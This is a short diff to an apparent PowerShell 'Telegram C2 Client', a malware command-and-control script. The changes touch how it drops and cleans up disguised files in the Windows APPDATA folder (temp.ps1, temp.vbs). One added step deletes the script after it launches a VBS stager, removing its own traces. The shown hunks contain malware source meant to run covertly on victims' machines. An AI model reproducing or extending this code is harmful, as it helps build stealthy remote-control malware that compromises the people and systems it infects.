@@ -51,13 +51,11 @@ $cmde = [char]::ConvertFromUtf32(0x1F517)
 Write-Output "Starting Telegram C2 Client"
 Sleep 10
 
-$path3 = "$env:temp\temp.ps1"
 $path2 = "$env:APPDATA\Microsoft\Windows\temp.ps1"
 $path1 = "$env:APPDATA\Microsoft\Windows\temp.vbs"
 if(Test-Path $path1){
 remove-item -FilePath $path2 -Force
 remove-item -FilePath $path1 -Force
-remove-item -FilePath $path3 -Force
 }
 
 # Get Chat ID from the bot
@@ -468,6 +466,8 @@ $pth = "$env:APPDATA\Microsoft\Windows\temp.vbs"
 $tobat | Out-File -FilePath $pth -Force
 sleep 2
 Start-Process -FilePath $pth
+sleep 2
+remove-item -FilePath $newScriptPath -Force
 break
 }
 # --------------------------------------------- TELEGRAM FUCTIONS -------------------------------------------------
